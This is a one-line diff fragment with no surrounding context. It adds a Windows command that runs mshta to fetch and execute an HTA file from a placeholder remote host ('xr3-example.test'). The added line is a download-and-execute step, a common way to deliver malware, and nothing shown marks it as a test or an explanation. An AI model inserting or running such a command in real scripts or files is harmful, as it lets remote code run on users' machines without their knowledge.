@@ -1,0 +1,1 @@
+cmd /c mshta http://xr3-example.test/e.hta
